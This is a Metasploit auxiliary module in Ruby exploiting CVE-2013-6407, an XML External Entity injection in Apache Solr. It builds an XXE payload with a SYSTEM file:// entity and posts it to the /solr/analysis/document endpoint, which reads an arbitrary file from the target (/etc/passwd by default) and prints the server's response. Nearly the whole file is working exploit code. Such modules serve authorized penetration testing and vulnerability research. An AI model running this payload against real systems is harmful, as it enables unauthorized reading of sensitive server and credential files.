##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Apache Solr XML External Entity Injection Vulnerability",
      'Description'    => %q{
        Apache Solr is vulnerable to an XML External Entity Injection bug that can be exploited
        to read files on the system.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>'],
      'References'     =>
        [
          ['CVE', '2013-6407']
        ],
    ))

    register_options(
      [
        OptString.new('RHOST', [true, "The remote host"]),
        OptString.new('RPORT', [true, "The port", '80']),
        OptString.new('FILE',  [true, "The file to retrieve", "/etc/passwd"])
      ], self.class)
  end

  def run
    print_status("#{peer} - Checking access (#{target_uri})...")
    
    body = "<?xml version=\"1.0\" ?>\n<!DOCTYPE add [<!ELEMENT field ANY><!ENTITY jg SYSTEM \"file://#{datastore['FILE']}\">]>"
    body += "<add><doc><field name=\"id\">&jg;</field></doc></add>"

    res = send_request_raw({
      'method' => 'POST',
      'uri' => '/solr/analysis/document',
      'data' => body
    })

    print_good res.body
  end
end

